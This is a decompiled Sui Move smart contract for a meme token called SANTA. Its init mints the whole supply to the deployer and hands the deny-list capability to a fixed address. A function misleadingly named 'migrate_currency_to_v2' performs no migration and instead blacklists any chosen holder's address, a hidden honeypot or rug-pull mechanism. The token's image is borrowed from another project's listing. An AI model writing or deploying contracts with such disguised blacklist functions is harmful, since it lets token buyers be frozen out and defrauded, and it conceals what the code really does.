module 0xb8051614d688c2812620eb1545d9e196994c28adca2429823ea65f1133df372f::santa {
    struct SANTA has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<SANTA>, arg1: 0x2::coin::Coin<SANTA>) {
        0x2::coin::burn<SANTA>(arg0, arg1);
    }

    fun init(arg0: SANTA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SANTA>(arg0, 9, b"SANTA", b"SANTA", b"Santa Claus Is Coming to Town", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/solana/2EgpQxxRy6SSsXG2YDx8fEM1Z8vyDRHmPAEzSowVpump.png?size=xl&key=7d872c")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SANTA>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SANTA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SANTA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SANTA>>(v1, @0x487757261b282a614efadb7512849c030aadfc18e569da0ead44e239cef6d3fa);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SANTA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SANTA>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<SANTA>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<SANTA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

